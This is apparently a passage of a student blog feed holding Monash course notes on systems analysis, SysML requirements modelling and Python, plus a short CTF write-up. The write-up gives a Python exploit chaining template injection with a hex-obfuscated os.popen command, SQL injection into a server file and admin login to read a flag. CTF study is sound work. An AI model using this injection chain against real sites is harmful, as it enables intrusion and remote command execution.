</p><p>Users can search for other users and establish contact with them. The connection request requires approval from the user receiving the request. Connected users will see each other’s “diary entries” in their “feed”, allowing them to comment on these entries. </p><h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><p>用户可以创建报告来跟踪性能和测量结果。移动应用程序支持一系列报告，例如燃烧的卡路里总数，或每周的距离。随着时间的推移，报告可能是用户日记中记录的简单测量，如体重或血压。 </p><p>Users can create reports to track performance and measurement results. The mobile application supports a series of reports, such as the total number of calories burned or the distance per week. Over time, reports may be simple measurements recorded in user diaries, such as weight or blood pressure. </p><h2 id="实施阶段"><a href="#实施阶段" class="headerlink" title="实施阶段"></a>实施阶段</h2><p>该公司只考虑开发移动应用程序。尽管这需要与索赔处理系统集成才能反映折扣，但第一阶段的实施却忽视了这些折扣。第二阶段将涵盖整合方面。 </p><p>The company only considers developing mobile applications. Although this requires integration with the claims processing system to reflect discounts, the implementation of the first phase overlooked these discounts. The second phase will cover the integration aspect. </p><hr><h1 id="用例描述"><a href="#用例描述" class="headerlink" title="用例描述"></a>用例描述</h1><h2 id="Record-Fitness-Activity（记录健身活动）"><a href="#Record-Fitness-Activity（记录健身活动）" class="headerlink" title="Record Fitness Activity（记录健身活动）"></a>Record Fitness Activity（记录健身活动）</h2><p>场景：用户在健身后打开应用程序，并选择“记录健身活动”用例。他们选择所进行的活动类型（如跑步、骑自行车、游泳），并输入相关信息（如距离、时间、地点等）。应用程序将记录这些信息并将其保存到用户的日记条目中。 </p><p>前置条件：用户已经下载并注册了健康生活应用程序，并且具有健身活动可以记录。 </p><h2 id="Record-Health-Measurements（记录健康指标）"><a href="#Record-Health-Measurements（记录健康指标）" class="headerlink" title="Record Health Measurements（记录健康指标）"></a>Record Health Measurements（记录健康指标）</h2><p>场景：用户打开应用程序，并选择“记录健康指标”用例。他们选择所记录的指标类型（如体重、血压、静息心率），并输入相关数据（如数值和日期）。应用程序将记录这些信息并将其保存到用户的日记条目中。 </p><p>前置条件：用户已经下载并注册了健康生活应用程序，并且需要记录某些健康指标。 </p><h2 id="Connect-with-Friends（连接朋友）"><a href="#Connect-with-Friends（连接朋友）" class="headerlink" title="Connect with Friends（连接朋友）"></a>Connect with Friends（连接朋友）</h2><p>场景：用户想要与其他健康生活应用程序用户建立联系。他们打开应用程序并选择“连接朋友”用例。用户可以搜索其他用户，并向他们发送连接请求。如果请求被接受，用户可以查看彼此的日记条目，并互相喜欢、评论和分享条目。 </p><p>前置条件：用户已经注册并登录到健康生活应用程序，并且想要连接其他用户。 </p><h2 id="View-Progress-and-Reports（查看进展和报告）"><a href="#View-Progress-and-Reports（查看进展和报告）" class="headerlink" title="View Progress and Reports（查看进展和报告）"></a>View Progress and Reports（查看进展和报告）</h2><p>场景：用户想要查看他们的进展和生成报告。他们打开应用程序，并选择“查看进展和报告”用例。应用程序将为他们生成有关他们的日记条目、健身活动和健康指标的报告，并允许用户跟踪他们的进展。 </p><p>前置条件：用户已经注册并登录到健康生活应用程序，并且想要查看他们的进展和报告。 </p><h2 id="Healthy-Living-App（健康生活应用程序）"><a href="#Healthy-Living-App（健康生活应用程序）" class="headerlink" title="Healthy Living App（健康生活应用程序）"></a>Healthy Living App（健康生活应用程序）</h2><p>场景：用户打开健康生活应用程序，并使用其各种功能。这包括记录健身活动、记录健康指标、连接其他用户、查看进展和报告等。 </p><p>前置条件：用户已经下载并注册了健康生活应用程序，并且想要使用它的各种功能。 </p><h2 id="class-diagram-amp-domain-class-diagram"><a href="#class-diagram-amp-domain-class-diagram" class="headerlink" title="class diagram &amp; domain class diagram"></a>class diagram &amp; domain class diagram</h2><p>A class diagram is a diagram that illustrates the classes, interfaces, and their relationships in a system. It provides an overview of the system’s objects, attributes, methods, and associations.<br>类图(Class Diagram)是一种图表，它展示了系统中类、接口及它们之间的关系。它提供了系统对象、属性、方法和关联的概览。</p><p>A domain class diagram, on the other hand, is a type of class diagram that focuses specifically on the objects and classes in a particular domain. The domain is a specific area of knowledge or expertise, such as accounting, medicine, or engineering. In a domain class diagram, only the classes that are relevant to that domain are included, and relationships between those classes are defined in terms of the domain’s concepts and terminology.<br>领域类图(Domain Class Diagram)则是一种特定类型的类图，它专注于某个特定领域中的对象和类。领域是特定的知识或专业领域，例如会计、医学或工程学。在领域类图中，只包括与该领域相关的类，并且这些类之间的关系以该领域的概念和术语来定义。</p><h3 id="The-main-differences"><a href="#The-main-differences" class="headerlink" title="The main differences"></a>The main differences</h3><p><code>Scope</code>: A domain class diagram has a <code>narrower</code> scope than a class diagram. It focuses only on the classes that are relevant to a specific domain.</p><p><code>Terminology</code>: A domain class diagram uses the terminology of the domain it represents, while a class diagram may use more general terminology.</p><p><code>Abstraction</code>: A domain class diagram may be more abstract than a class diagram, as it may leave out details that are not relevant to the domain.</p><p><code>Purpose</code>: A domain class diagram is designed to help people understand the relationships between classes within a specific domain, while a class diagram is designed to provide an overview of the classes, interfaces, and their relationships in a system.</p>]]></content>
    
    
    <summary type="html">“健康生活” 手机APP</summary>
    
    
    
    <category term="Monash笔记" scheme="https://manayakko.github.io/yakko117/categories/Monash%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Paper Note Taking" scheme="https://manayakko.github.io/yakko117/tags/Paper-Note-Taking/"/>
    
  </entry>
  
  <entry>
    <title>User requirements modeling and analysis of software-intensive systems</title>
    <link href="https://manayakko.github.io/yakko117/2023/03/23/Modelling_paper_note_taking/"/>
    <id>https://manayakko.github.io/yakko117/2023/03/23/Modelling_paper_note_taking/</id>
    <published>2023-03-23T06:26:31.287Z</published>
    <updated>2023-04-18T21:48:49.947Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p><a href="https://doi.org/10.1016/j.jss.2010.10.020">https://doi.org/10.1016/j.jss.2010.10.020</a><br>Author: <em>Michel dos Santos Soares, Jos Vrancken, Alexander Verbraeck</em><br><em>Delft University of Technology</em></p><h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>根据用户需求开发(user requirements development)，记录和分析软件密集型系统的用户需求的活动。<br>对进一步的需求工程活动有用的建模活动。当前的需求建模技术存在许多问题和局限性。因此进行改进，作者提出了需求建模语言的需求列表。</p><p>主要展示 SysML 图表和表格的一些扩展如何满足其中的大部分要求。</p><h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Requirements<br>UML<br>SysML (Systems Modeling Language)<br>Software-intensive systems</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Software-intensive systems 软件密集型系统<br>如何改进软件密集型系统的用户需求建模和分析？<br>How to improve user requirements modeling and analysis for software-intensive systems?</p><p>E.g.<br>RTMS &#x3D; Road Traffic Management System</p><ul><li>List of requirements</li></ul><p><strong>Requirements modeling approaches</strong></p><ul><li>graphics-based 图形</li><li>purely textual 纯文本</li><li>combination of both</li></ul><p>The most common approach is to write user requirements using <em>natural language</em>.<br>However, problems such as imprecision, misunderstandings, ambiguity and inconsistency are common when natural language is used (Kamsties, 2005)</p><p>SysML 需求图有助于更好地组织需求，还可以明确显示不同需求之间的各种关系。<br>The SysML Requirements diagram helps in better organizing requirements, and also shows explicitly the various kinds of relationships between different requirements. </p><p>(M) must (S)should</p><p><strong>Information Function</strong></p><table><thead><tr><th>UML</th><th>sysML</th></tr></thead><tbody><tr><td>缺点：抽象，难以映射到现实系统</td><td>缺点：应用范围相对较窄，主要适用于大型、复杂系统的建模。</td></tr><tr><td>缺点： 语法存在歧义难以理解，容易导致建模错误，同时需要专业知识背景，或相应知识学习</td><td>缺点：单一方面专业性较强，对于一般软件工程师来说学习和应用门槛较高。</td></tr><tr><td>优点：通用的建模语言，可以用于多种软件系统，具有广泛的适用性</td><td>缺点：应用范围相对较窄，主要适用于大型、复杂系统的建模。</td></tr><tr><td>优点：提供了丰富的建模工具和概念，如类图、对象图、顺序图、活动图、状态图等等，可以覆盖多种软件系统的建模需求。</td><td></td></tr></tbody></table><p>Clearly display user needs in a visual form</p><ul><li>User requirements are expressed in tabular form.</li><li>Understand what happens when relevant requirements are changed or deleted.</li><li>Use case diagrams to represent the actors involved and the scenarios to be implemented.</li></ul><p>There are several approaches to modeling requirements. Basically, these approaches can be classified as graphics-based, purely textual, or a combination of both. Some are generic while others are part of a specific methodology. The most common approach is to write user requirements using natural language. However, problems such as imprecision, misunderstandings, ambiguity and inconsistency are common when natural language is used. To solve these problems, structured natural language is used. SysML is a good example of this. (表)<br>有几种建模需求的方法。 基本上，这些方法可以分为基于图形的、纯文本的或两者的结合。 有些是通用的，而另一些是特定方法的一部分。 最常见的方法是使用自然语言编写用户需求。 然而，在使用自然语言时，不精确、误解、歧义和不一致等问题很常见。 为了解决这些问题，使用了结构化的自然语言。 SysML 就是一个很好的例子。 (表示)</p><p>This list of requirements required for requirements modeling languages is given, as well as mappings of common languages and technologies. From the table, it is clear that “Must have” requirements, such as “Priority between requirements”, “Requirements risks”, “Identify types of requirements”, and “Ranking requirements by stability” are partially addressed or not addressed at all by most of the studied requirements modeling languages. And another conclusion from the table is that some “Must have” requirements and the majority of “Should have” requirements are fulfilled or at least partially fulfilled by a combination of the SysML Requirements diagram and SysML Tables. （图）<br>给出了需求建模语言所需的需求列表，以及通用语言和技术的映射。 从表中可以清楚地看出，“必须有”需求，如“需求之间的优先级”、“需求风险”、“识别需求类型”和“按稳定性对需求进行排名”等，部分解决或根本没有解决 大多数研究过的需求建模语言。 从该表中得出的另一个结论是，通过 SysML 需求图和 SysML 表的组合，可以满足或至少部分满足一些“必须具备”的要求和大部分“应该具备”的要求。 （图）</p><p>To better understand the relationship between requirements. SYsML extends the hierarchy and derived relationships that connect to requirements and represent dependencies between requirements and models. This can effectively reduce the ambiguity generated by the statement. (图)<br>更好地理解需求之间的关系。 SYsML 扩展了连接到需求并表示需求和模型之间依赖关系的层次结构和派生关系。 这样可以有效减少语句产生的歧义。 (图)</p><p>At the same time, SysML has also expanded additional properties, including risk assessment, which is used to assess the impact of risks on project objectives. The specific approach is to add a tuple to the requirement, including the impact of probability and risk.<br>同时，SysML 还扩展了额外的属性，包括风险评估，用于评估风险对项目目标的影响。 具体做法是在需求中增加一个元组，包括概率和风险的影响。</p><h2 id="The-analysis-of-SysML-Requirements-diagram"><a href="#The-analysis-of-SysML-Requirements-diagram" class="headerlink" title="The analysis of SysML Requirements diagram:"></a>The analysis of SysML Requirements diagram:</h2><ul><li>Better to organize requirements</li><li>Creating a clear overview of system structure → manage size and complexity more easily<br>创建清晰的系统结构概览 → 更轻松地管理规模和复杂性</li><li>Facilitating problem-solving and system scaling<br>促进问题解决和系统扩展</li><li>Use Case diagrams lack well-defined semantics<ul><li>E.g. the include and extend relationships are considered similar (Jacobson, 2004).</li></ul></li><li>Issues of imprecision, misunderstanding, ambiguity and inconsistency are reduced (Kamsties, 2005).<ul><li>E.g. Ambiguity can be solved with the use of formal methods (Hinchey et al., 2008)</li></ul></li></ul><p>Iterative development: The Requirements Diagram can be used to support an iterative development process, where requirements are refined and updated over time. This helps ensure that the system meets evolving needs and can adapt to changing circumstances.<br>迭代开发：需求图可用于支持迭代开发过程，在该过程中，需求会随着时间的推移而细化和更新。 这有助于确保系统满足不断变化的需求并能够适应不断变化的环境。</p><p>System scaling: The Requirements Diagram can be used to identify areas where the system can be scaled or extended to meet new requirements or accommodate future growth. This helps ensure that the system can continue to meet the needs of stakeholders over time.<br>系统扩展：需求图可用于确定可以扩展或扩展系统以满足新需求或适应未来增长的区域。 这有助于确保系统能够随着时间的推移继续满足利益相关者的需求。</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><ul><li>In system development, the use of SysML requirement diagrams can be a good response to requirements changes.</li><li>proposed classification of user requirements, and then draw the SysML Requirements diagram, and based on UML extended with new stereotypes<ul><li>The scope of adaptation of sysML is not as wide as that of UML. Due to its professionalism, it will be carried out in a more refined direction.</li></ul></li><li>when using formal methods, other properties, such as “human readable” may be lost (the function should be improved)</li></ul><h2 id="Use-Case-Diagram"><a href="#Use-Case-Diagram" class="headerlink" title="Use Case Diagram"></a>Use Case Diagram</h2><p>Use Case Diagram in SysML is a graphical representation of the interactions between actors (users or other systems) and a system, depicting the functional requirements of the system.<br>SysML 中的用例图是参与者（用户或其他系统）与系统之间交互的图形表示，描述了系统的功能需求。</p><p>Use Case Diagrams are used to communicate with stakeholders about the functional requirements of a system. They help to identify the system’s behavior and its interactions with other systems or users. The diagram can be used to describe the scope of the system, the actors involved, and the relationships between them, which helps to identify potential issues or requirements that may have been overlooked.<br>用例图用于与利益相关者就系统的功能需求进行沟通。 它们有助于识别系统的行为及其与其他系统或用户的交互。 该图可用于描述系统的范围、涉及的参与者以及它们之间的关系，这有助于识别可能被忽略的潜在问题或需求。</p><h2 id="Requirements-Diagram"><a href="#Requirements-Diagram" class="headerlink" title="Requirements Diagram"></a>Requirements Diagram</h2><p>Requirements Diagram in SysML is a graphical representation of the requirements for a system. It provides a structured way to capture and organize requirements, which can help to ensure that all stakeholders have a clear understanding of the system’s needs and goals.<br>SysML 中的需求图是系统需求的图形表示。 它提供了一种结构化的方式来捕获和组织需求，这有助于确保所有涉众都清楚地了解系统的需求和目标。</p><p>The Requirements Diagram typically consists of several parts, including requirements, requirements categories, and requirement relationships. Requirements are represented as rectangular shapes, and each requirement is labeled with a unique identifier and a brief description. Requirements categories are used to group related requirements together, and relationships between requirements are used to show dependencies and interactions between them.<br>需求图通常由几个部分组成，包括需求、需求类别和需求关系。 需求以矩形表示，每个需求都标有唯一标识符和简短描述。 需求类别用于将相关需求分组在一起，需求之间的关系用于显示它们之间的依赖关系和相互作用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A</summary>
      
    
    
    
    <category term="Monash笔记" scheme="https://manayakko.github.io/yakko117/categories/Monash%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Paper Note Taking" scheme="https://manayakko.github.io/yakko117/tags/Paper-Note-Taking/"/>
    
  </entry>
  
  <entry>
    <title>BuuctfDay11</title>
    <link href="https://manayakko.github.io/yakko117/2023/03/16/BUUCTFDay11/"/>
    <id>https://manayakko.github.io/yakko117/2023/03/16/BUUCTFDay11/</id>
    <published>2023-03-16T03:57:21.361Z</published>
    <updated>2023-07-10T17:44:45.614Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="QWB2021-Quals-托纳多"><a href="#QWB2021-Quals-托纳多" class="headerlink" title="[QWB2021 Quals]托纳多"></a>[QWB2021 Quals]托纳多</h1><p><a href="https://www.anquanke.com/post/id/244153#h2-4">出题佬的恶意</a><br>算了 被WAF了</p><p>写一下学习笔记好了</p><p><a href="https://www.leavesongs.com/PENETRATION/arbitrary-files-read-via-static-requests.html">os.path.join考点</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>(<span class="params">url</span>):</span><br><span class="line">    file_name = random_str(<span class="number">6</span>)</span><br><span class="line">    register_payload = url+<span class="string">&quot;/register.php?password=1&amp;username=%7b%7b__import__(bytes.fromhex(str(hex(28531))[2:]).decode()).popen(bytes.fromhex(str(hex(159698592644438093083295786740770931105195540868394758120956263))[2:]).decode()).read()%7d%7d&quot;</span></span><br><span class="line">    requests.get(register_payload)</span><br><span class="line">    upload_file_payload = url+<span class="string">&quot;/register.php?password=1&amp;username=1&#x27; or 1 into outfile &#x27;/var/lib/mysql-files/&quot;</span> + file_name</span><br><span class="line">    requests.get(upload_file_payload)</span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.get(url+<span class="string">&quot;/login.php?username=admin&amp;password=we111c000me_to_qwb&quot;</span>)</span><br><span class="line">    res = s.get(url+<span class="string">&quot;/good_job_my_ctfer.php?congratulations=&#123;%25extends /var/lib/mysql-files/&quot;</span> + file_name + <span class="string">&quot;%25&#125;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="built_in">bytes</span>.fromhex(<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">28531</span>))[<span class="number">2</span>:]).decode()</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">bytes</span>.fromhex(<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">159698592644438093083295786740770931105195540868394758120956263</span>))[<span class="number">2</span>:]).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a1)</span><br><span class="line"><span class="comment"># os</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># cat /qwb_002b677144e0/flag</span></span><br></pre></td></tr></table></figure></div>]]></content>
    
    
    <summary type="html">Monsec 没意思 安心搞学习</summary>
    
    
    
    <category term="做题笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="writeup" scheme="https://manayakko.github.io/yakko117/tags/writeup/"/>
    
    <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Monash Courses 2023S1 FIT9130</title>
    <link href="https://manayakko.github.io/yakko117/2023/03/01/MonashCs9130/"/>
    <id>https://manayakko.github.io/yakko117/2023/03/01/MonashCs9130/</id>
    <published>2023-03-01T00:22:11.455Z</published>
    <updated>2023-04-26T00:35:45.467Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>要考试，感觉是纯理论性质的课程，希望能拿HD</p><h1 id="FIT9130-系统分析与设计"><a href="#FIT9130-系统分析与设计" class="headerlink" title="FIT9130 系统分析与设计"></a>FIT9130 系统分析与设计</h1><h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><p>有考试，有paper，好好理解好好学</p><h2 id="Conception"><a href="#Conception" class="headerlink" title="Conception"></a>Conception</h2><ol><li><p><strong><font color="red">What is information system?</font></strong></p><ul><li>consist of interrelated computer components for <strong>collecting, storing, processing and analyzing</strong> data to produce the information that <strong><font color="red">helps businesses to meet their needs</font></strong> or solve their problems.</li></ul></li><li><p>Why Data is important?</p><ul><li>It provides functionalities to ensure critical information is stored and made available.</li><li><strong>better systems</strong> lead to more <strong>productive and profitable</strong> organizations.</li></ul></li></ol><p>system is a <strong>process</strong> –&gt; task -&gt; subsystem</p><p>requirement–&gt; need of the client</p><p>risk of <strong>understanding requirements</strong></p><ul><li>occur some issues</li><li>designing the requirements</li></ul><p>software requirement specialization</p><p>business website<br>Not just at present, to consider for the future</p><p><strong><font color="red">next week analysis</font></strong><br>a way to approach the problems<br>UML –&gt; logical padding language</p><hr><h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><p>A system is a <strong>collection of related elements</strong> of components that work together to achieve a <font color="red">common purpose</font>.</p><p>Information system:<br>business; data; people; software; hardware etc</p><h2 id="system-amp-software"><a href="#system-amp-software" class="headerlink" title="system &amp; software"></a>system &amp; software</h2><p>system dev cycle end-to-emd</p><ul><li>people</li><li>processes</li><li>tech dev</li></ul><table><thead><tr><th>Activity diagram</th><th>Flowchart</th></tr></thead><tbody><tr><td>A graphical representation of workflows of stepwise activities and actions with support for choice, iteration, concurrency</td><td>A diagrammatic representation that illustrates a solution model to a given problem</td></tr><tr><td>helps to understand the business process or workflow of the system</td><td>helps to analyze &amp; design a program</td></tr><tr><td>Associated with UML</td><td>Associated with programming</td></tr></tbody></table><h2 id="lifecycles"><a href="#lifecycles" class="headerlink" title="lifecycles"></a>lifecycles</h2><p>&#x2F;&#x2F; iteration 迭代 implement 使生效<br>requirements-&gt;analysis-&gt;design-&gt;implement</p><p>iterative<br>incremental<br>iterative &amp; incremental</p><h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><p>a way to approach a problem</p><ul><li>models; tools; techniques</li></ul><p><strong>ways</strong> -&gt; predictive(assuming<font color="red">[risk is higher in waterfall]</font> for the client)<br>-&gt; adaptive change &amp; completing</p><p>Waterfall models couldn’t be predictive<br>One reason to choose waterfall is the client number&#x2F;level? is very high</p><p>Waterfall with Ituation will divide whole product into different parts</p><p>heavy weight –&gt; documentation</p><p>XP[Extreme Programming] -&gt; user stories</p><h2 id="SCRUM-2nd-assignment"><a href="#SCRUM-2nd-assignment" class="headerlink" title="SCRUM 2nd assignment!!!"></a>SCRUM 2nd assignment!!!</h2><p>sprint planning will in 4-5 weeks</p><h2 id="deep-structure"><a href="#deep-structure" class="headerlink" title="deep structure"></a>deep structure</h2><p>analysis –&gt; core activities </p><ol><li>info structure<ul><li><code>Things</code> to keep information about</li><li>information about things</li><li>relationship btw things</li></ul></li><li>Function structure<ul><li>who uses the system</li><li>emphasis what purpose</li></ul></li></ol><p>how your system represent the business<br>map to guide the thinking –&gt; client </p><h2 id="Tutorial-2-Case-1"><a href="#Tutorial-2-Case-1" class="headerlink" title="Tutorial 2 Case 1"></a>Tutorial 2 Case 1</h2><p>Core: car mental<br><em>identify important business</em><br><strong>Things#1</strong>: Cars -&gt; model type mileage<br><strong>Things#2</strong>: Drivers -&gt; Name; drive license; gender<br><strong>Things#3</strong>: Assignment -&gt; what purpose, relationship </p><p>Things#extra: Customers (relevant to the business), maybe system could booking, management and so on…</p><p><strong>Who is going to use the system</strong><br>the manager, drivers, customers</p><p>开启了阅读paper的思路</p><hr><h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="lecture"><a href="#lecture" class="headerlink" title="lecture"></a>lecture</h2><h2 id="System-Development-Life-Cycle-SDLC"><a href="#System-Development-Life-Cycle-SDLC" class="headerlink" title="System Development Life Cycle (SDLC)"></a>System Development Life Cycle (SDLC)</h2><p>Key skills:</p><ul><li><strong>fact-finding</strong> for investigation of system requirements</li><li>learning <strong>details of business processes</strong> &amp; daily operations</li><li>becoming as knowledgeable as business domain users to build <strong>credibility</strong></li><li>bring in <strong>fresh perspectives</strong> to problem</li><li><strong>modelling</strong> of business processes based on system<br>requirements</li></ul><table><thead><tr><th>Analysis activities</th><th>Key questions</th></tr></thead><tbody><tr><td>Gather detailed information; Become <em>an expert in that business area</em></td><td>Do we have all the information (and insight) we need to define what the system must do?</td></tr><tr><td>Define (functional and nonfunctional) requirements; <em>Not only writing up but modelling</em></td><td>What in detail do we need the system to do?</td></tr><tr><td>Prioritise requirements(<em>Why is this activity important?</em>)</td><td>What are the most important things the system must do?</td></tr></tbody></table><p>what do you need, what do you purpose </p><h2 id="Good-Requirement-Statements"><a href="#Good-Requirement-Statements" class="headerlink" title="Good Requirement Statements"></a>Good Requirement Statements</h2><p><font color="red">The online banking system</font> <font color="blue">shall allow</font> the Internet user to <font color="green">access</font> her current account balance in <font color="yellow">less than 5 seconds</font>.</p><ol><li><font color="red">Defines the system under discussion</font></li><li><font color="blue">Verb with a correct identifier(shall&#x2F;may)</font></li><li><font color="green">Positive end-result</font></li><li><font color="yellow">Quality</font></li></ol><h2 id="Tutorial"><a href="#Tutorial" class="headerlink" title="Tutorial"></a>Tutorial</h2><p>requirement –&gt; <strong>need &amp; client</strong><br>client –&gt; stakeholders(internal external) –&gt; directly&#x2F; indirectly involved with the project </p><p>requirements are the pieces source of project for issues</p><p>gather requirements</p><ol><li>interview</li><li>surveys</li><li>observation </li><li>research –&gt; to avoid the same mistakes</li><li>workshop –&gt; JAD(Joint Application Development) session?</li></ol><p>Directly related to the prospect</p><p>Non-function requirement support </p><p>risk requirement </p><p>client has no knowledge about <strong>Non-function requirement</strong> and assume all the requirement</p><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><ol><li>One of the toughest problems in investigating system requirements is to make sure they are complete and comprehensive. How would you ensure that you get all the right information during an interview session?</li></ol><h2 id="paper-x2F-report"><a href="#paper-x2F-report" class="headerlink" title="paper &#x2F; report"></a>paper &#x2F; report</h2><ul><li>Title&#x2F; abstract</li><li>introduction–&gt; help readers to know the research</li><li>methodology<ul><li>philosophy assumption</li><li>research paradigm&#x2F;&#x2F;范例，样式</li><li>research method</li><li>research techniques -&gt; data collections &#x2F; data analysis</li><li>Q – Methodology –&gt; A</li></ul></li><li>results </li><li>discussion(conclusion is very short&#x2F;combine)</li></ul><p>add in slides</p><ul><li>opinions or Views</li></ul><hr><h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><p>requirements analysis –&gt; Result of this analysis content&#x2F; modelling<br>Design the requirements(assessments)</p><p>Do it using UML </p><p>language –&gt; implement the project</p><p>Context level diagram</p><ul><li>level 0 diagram(traditional approach)</li><li>External entities&#x2F; system name</li><li>I&#x2F;O flow</li></ul><p>To see the processes inside a context level diagram we use <code>use case diagram</code></p><ul><li>define the system boundary – contains the name of system</li><li>primary users will be on the left side of the system boundary</li><li>secondary users on the right side</li><li>use case –&gt; verb with a noun (e.g. add customer)</li><li>relations  include &amp; extend<ul><li>&lt;\include&gt; will be  before the completion</li></ul></li></ul><hr><h1 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h1><p>presentation</p><h1 id="week6"><a href="#week6" class="headerlink" title="week6"></a>week6</h1><p>Use case diagram<br>steps to implement the functionality</p><h1 id="week8"><a href="#week8" class="headerlink" title="week8"></a>week8</h1><h2 id="Lecture"><a href="#Lecture" class="headerlink" title="Lecture"></a>Lecture</h2><p>assignment3 new notifications &amp; assignment2 interview</p><h2 id="Assignmen3-Systems-Design"><a href="#Assignmen3-Systems-Design" class="headerlink" title="Assignmen3 Systems Design"></a>Assignmen3 Systems Design</h2><p>SSD(system sequence diagram) is a conceptual level so just has User &amp; system(app)<br><strong>NO UI!!!</strong></p><p>Part B 3 diagram<br>First-cut design<br>SSD<br>final-cut class diagram</p>]]></content>
    
    
    <summary type="html">HD 欧内该</summary>
    
    
    
    <category term="Monash笔记" scheme="https://manayakko.github.io/yakko117/categories/Monash%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Monash Cs" scheme="https://manayakko.github.io/yakko117/tags/Monash-Cs/"/>
    
  </entry>
  
  <entry>
    <title>Monash Courses 2023S1 FIT9136</title>
    <link href="https://manayakko.github.io/yakko117/2023/03/01/MonashCs9136/"/>
    <id>https://manayakko.github.io/yakko117/2023/03/01/MonashCs9136/</id>
    <published>2023-02-28T20:22:30.517Z</published>
    <updated>2023-05-18T05:12:04.132Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>什么奇奇怪怪的大课形式</p><h1 id="FIT9136-Python"><a href="#FIT9136-Python" class="headerlink" title="FIT9136 Python"></a>FIT9136 Python</h1><p>虽然不用考试，但是有些知识点可以了解一下。</p><h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><p>简单的通识教育<br><a href="https://runestone.academy/ns/books/published/fopp/index.html">学校给的参考文献</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Ask for radius</span></span><br><span class="line">radius = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the radius: &quot;</span>))</span><br><span class="line"><span class="comment">#let area = (radius2) × π</span></span><br><span class="line">area = (radius * radius) * <span class="number">3.1415</span></span><br><span class="line"><span class="comment">#Display area</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The area of a circle with radius&quot;</span>, radius, <span class="string">&quot;is:&quot;</span>, <span class="string">&#x27;%.4f&#x27;</span>%area)</span><br><span class="line"><span class="comment"># 保留指定小数</span></span><br></pre></td></tr></table></figure></div><p>Algorithms is <strong>A step by step sequence of instructions that if followed exactly will solve the problem under 